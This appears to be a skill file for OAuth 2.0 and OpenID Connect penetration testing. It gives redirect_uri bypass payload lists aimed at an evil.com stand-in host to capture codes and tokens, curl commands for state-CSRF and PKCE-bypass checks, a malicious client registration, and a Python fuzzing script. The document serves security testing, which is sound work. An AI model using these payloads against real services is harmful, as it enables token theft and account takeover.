---
name: oauth
description: OAuth 2.0 and OpenID Connect security testing — redirect URI bypass, token theft, state CSRF, implicit flow downgrade attacks
---

# OAuth/OIDC Misconfigurations

OAuth 2.0 and OpenID Connect are the dominant authorization/authentication frameworks for web and mobile applications. Their complexity — multiple grant types, redirect URI validation, token handling, and multi-party trust — creates a wide attack surface. A single OAuth misconfiguration typically yields account takeover. Focus on redirect_uri bypass (token theft), missing state (CSRF), and flow downgrade attacks.

## Attack Surface

**OAuth Endpoints to Discover**
```bash
# Authorization endpoint
/.well-known/openid-configuration
/oauth/authorize
/auth/authorize
/connect/authorize
/oauth2/auth

# Token endpoint
/oauth/token
/auth/token
/connect/token

# UserInfo
/oauth/userinfo
/auth/userinfo
/connect/userinfo

# Discovery
curl -s https://target.com/.well-known/openid-configuration | jq .
curl -s https://accounts.target.com/.well-known/openid-configuration | jq .
```

**Client Registration and Metadata**
```bash
# Dynamic client registration (if enabled)
curl -s https://target.com/oauth/register \
  -H 'Content-Type: application/json' \
  -d '{"redirect_uris":["https://evil.com/callback"],"client_name":"test"}'

# Check for exposed client secrets in:
# - JavaScript bundles
# - Mobile app decompilation
# - .env files
# - API documentation
```

**Grant Types to Test**
- Authorization Code (most common, most secure when implemented correctly)
- Authorization Code + PKCE (mobile/SPA — test PKCE bypass)
- Implicit (deprecated but still supported on many providers)
- Client Credentials (machine-to-machine)
- Device Code (TV/IoT — test polling abuse)
- ROPC / Resource Owner Password Credentials (direct credential exchange)

## Key Vulnerabilities

### redirect_uri Bypass (Token Theft)

The most impactful OAuth vulnerability. If you can redirect the authorization response to an attacker-controlled URL, you steal the authorization code or token.

**Common bypass techniques:**

**Subdomain matching:**
```
# If allowed redirect_uri is https://app.target.com/callback
https://evil.app.target.com/callback    # subdomain injection
https://app.target.com.evil.com/callback # suffix confusion
```

**Path traversal:**
```
https://app.target.com/callback/../../../evil-page
https://app.target.com/callback/..%2F..%2Fevil-page
https://app.target.com/callback%2F..%2F..%2Fevil-page
```

**Parameter pollution:**
```
https://app.target.com/callback?redirect=evil.com
https://app.target.com/callback#@evil.com
https://app.target.com/callback@evil.com
```

**Open redirect chaining:**
```
# Find an open redirect on the allowed domain
https://app.target.com/redirect?url=https://evil.com
# Use it as redirect_uri:
redirect_uri=https://app.target.com/redirect?url=https://evil.com/steal
```

**Comprehensive redirect_uri fuzzing payloads:**
```
https://evil.com
https://evil.com%23@target.com
https://target.com@evil.com
https://target.com%40evil.com
https://evil.com%252f@target.com
https://target.com/callback?next=https://evil.com
https://target.com/callback/../open-redirect?url=evil.com
https://target.com:443@evil.com
https://evil.com#.target.com
https://evil.com?.target.com
https://target.com/callback/../../path?to=evil
javascript://target.com/%0aalert(1)
https://target.com\@evil.com
https://target.com%5c@evil.com
data://target.com
```

### Missing State Parameter (CSRF)

Without a `state` parameter tied to the user's session, an attacker can force a victim to authenticate with the attacker's account:

```
1. Attacker initiates OAuth flow → gets authorization code
2. Attacker crafts URL: https://target.com/callback?code=ATTACKER_CODE
3. Victim clicks link → their session is now linked to attacker's OAuth account
4. Attacker logs in via OAuth → has access to victim's account
```

**Testing:**
```bash
# Remove state parameter from authorization request
# Check if callback accepts the response without state validation
curl -s 'https://target.com/oauth/callback?code=AUTH_CODE' -b 'session=VICTIM_SESSION'
# If no error → state is not validated
```

### Token Leakage via Referer

When the redirect_uri page loads external resources, the authorization code or token can leak in the Referer header:

```html
<!-- Callback page at target.com/callback?code=SECRET_CODE -->
<!-- If this page loads external resources: -->
<img src="https://external-analytics.com/pixel.gif">
<!-- Referer: https://target.com/callback?code=SECRET_CODE -->
```

**Testing:**
```bash
# Check if callback page loads external resources
curl -s 'https://target.com/callback?code=test' | grep -iE 'src=.https?://[^"]*[^target.com]'
```

### Implicit Flow Forced Downgrade

Force the server to use the less-secure implicit flow even when authorization code flow is intended:

```bash
# Change response_type from 'code' to 'token'
# Original: response_type=code
# Modified: response_type=token

# The token is returned in the URL fragment, visible to JavaScript on the redirect page
https://target.com/callback#access_token=SECRET_TOKEN&token_type=bearer
```

### PKCE Bypass

PKCE (Proof Key for Code Exchange) prevents authorization code interception. Test if it is properly enforced:

```bash
# Test 1: Omit code_verifier from token exchange
curl -X POST https://target.com/oauth/token \
  -d 'grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://target.com/callback&client_id=CLIENT_ID'
# If token is returned without code_verifier → PKCE not enforced

# Test 2: Use mismatched code_verifier
curl -X POST https://target.com/oauth/token \
  -d 'grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://target.com/callback&client_id=CLIENT_ID&code_verifier=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
# If token is returned → PKCE validation is broken

# Test 3: Downgrade code_challenge_method
# Change from S256 to plain
code_challenge_method=plain&code_challenge=KNOWN_VERIFIER
```

### Account Takeover via Unverified Email

Some OAuth providers return email addresses that are not verified. If the target application trusts the email for account linking:

```
1. Attacker creates account on OAuth provider with victim's email (unverified)
2. Attacker authenticates via OAuth to target application
3. Target links attacker's OAuth to victim's existing account (matching email)
4. Attacker now has access to victim's account
```

**Testing:**
```bash
# Check if the IdP marks email as verified
# In the ID token or userinfo response, look for:
# "email_verified": false
# If the SP does not check this field → vulnerable
```

### Scope Escalation

```bash
# Request more scopes than the client is authorized for
scope=openid email profile admin
scope=openid email profile user:admin
scope=read write delete admin

# Test scope injection via whitespace/separator tricks
scope=openid%20admin
scope=openid+admin
scope=openid,admin
```

## Bypass Techniques

**redirect_uri Normalization Tricks**
- Case variation: `HTTPS://TARGET.COM/Callback`
- Port inclusion: `https://target.com:443/callback`
- Trailing slash: `https://target.com/callback/`
- IP address instead of hostname: `https://93.184.216.34/callback`
- URL encoding: `https://target.com/%63allback`
- Unicode normalization: `https://target.com/ⅽallback` (Unicode 'c')
- Backslash: `https://target.com\@evil.com` (parser confusion)

**Token Reuse Across Clients**
- If the authorization server issues tokens without binding to a specific client, tokens from one client can be used with another
- Test by using an access token obtained from Client A with Client B's API calls

**Race Conditions in Code Exchange**
- Some servers allow a code to be exchanged multiple times within a short window
- Test rapid parallel requests to the token endpoint with the same code

## Tools

**Burp Suite OAuth Flow Testing**
```
1. Proxy the full OAuth flow through Burp
2. Intercept the authorization request → modify redirect_uri, state, scope, response_type
3. Intercept the callback → observe what parameters are returned
4. Intercept the token exchange → test without code_verifier, with wrong client_secret
```

**oauth-redirect-checker (custom script)**
```python
import requests
import urllib.parse

base_auth_url = "https://target.com/oauth/authorize"
client_id = "CLIENT_ID"
payloads = [
    "https://evil.com",
    "https://evil.com%23@target.com",
    "https://target.com@evil.com",
    "https://target.com/callback/../redirect?url=evil.com",
    "https://target.com/callback%2F..%2F..%2Fevil",
]

for payload in payloads:
    url = f"{base_auth_url}?client_id={client_id}&redirect_uri={urllib.parse.quote(payload, safe='')}&response_type=code&scope=openid"
    r = requests.get(url, allow_redirects=False)
    if r.status_code in [302, 303] and 'evil' in r.headers.get('Location', ''):
        print(f"[VULN] {payload} → {r.headers['Location']}")
    elif r.status_code == 200 and 'error' not in r.text.lower():
        print(f"[MAYBE] {payload} → 200 (check manually)")
    else:
        print(f"[SAFE] {payload} → {r.status_code}")
```

**jwt.io / jwt-cli**
```bash
# Decode and inspect ID tokens and access tokens
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Check for sensitive claims
# iss (issuer), aud (audience), sub (subject), email, email_verified, scope, exp
```

## Testing Methodology

1. **Discover OAuth configuration** — Fetch `.well-known/openid-configuration`, identify authorization/token/userinfo endpoints
2. **Map the flow** — Proxy the complete OAuth flow, document all parameters (client_id, redirect_uri, scope, state, nonce, code_challenge)
3. **Test redirect_uri** — Fuzz with all bypass techniques; chain with open redirects on the allowed domain
4. **Test state parameter** — Remove or reuse state; attempt CSRF login attack
5. **Test response_type downgrade** — Switch from `code` to `token` or `id_token`
6. **Test PKCE enforcement** — Omit code_verifier, use wrong verifier, downgrade to plain
7. **Test scope escalation** — Request additional scopes beyond what the client should have
8. **Test token exchange** — Try exchanging codes without client_secret, with wrong secret, or multiple times
9. **Test account linking** — Create OAuth account with victim's email; check email_verified handling
10. **Test token leakage** — Check Referer header leakage, browser history, and log exposure

## Validation Requirements

1. **redirect_uri bypass**: Show that the authorization response (code or token) is delivered to an attacker-controlled URL
2. **State CSRF**: Demonstrate linking victim's account to attacker's OAuth identity
3. **Token theft**: Show actual token capture and use it to access the victim's resources
4. **Account takeover**: Prove access to another user's account via the OAuth vulnerability
5. **Working PoC**: Provide a step-by-step reproduction with exact URLs and parameters

## False Positives

- redirect_uri validation that strictly matches the full URL (scheme, host, port, path)
- State parameter validated against server-side session state
- PKCE properly enforced with S256 method
- Token endpoint requires valid client_secret for confidential clients
- Authorization codes are single-use with short expiration
- Email linking requires email_verified=true from the IdP

## Impact

- **Account takeover** — Steal authorization codes or tokens via redirect_uri bypass
- **Session hijacking** — CSRF login forcing victim into attacker's account, then monitoring activity
- **Privilege escalation** — Scope escalation granting admin permissions
- **Data theft** — Access to user's resources on the OAuth provider (email, contacts, files)
- **Cross-application compromise** — Token reuse across clients sharing the same OAuth provider

## Pro Tips

1. Always look for open redirects on the allowed redirect_uri domain first — this is the most reliable redirect_uri bypass
2. Try both URL-encoded and decoded versions of every bypass payload — different servers parse differently
3. The implicit flow (response_type=token) is almost always more exploitable because the token appears in the URL fragment
4. Mobile apps often have more permissive redirect_uri validation (custom schemes like `myapp://callback`)
5. Check if the authorization server supports dynamic client registration — if so, register a client with your own redirect_uri
6. ID tokens often contain more information than access tokens — decode both with jwt.io
7. Test the token revocation endpoint — some implementations do not properly invalidate tokens
8. OAuth flows in mobile apps may be vulnerable to intent interception (Android) or universal link hijacking (iOS)

## Summary

OAuth security depends on strict redirect_uri validation, state parameter enforcement, and proper PKCE implementation. Redirect_uri bypass is the highest-impact vector — always fuzz exhaustively and chain with open redirects. Test every grant type the server supports, attempt flow downgrades, and verify that email-based account linking requires verified emails. A single OAuth misconfiguration typically yields complete account takeover.
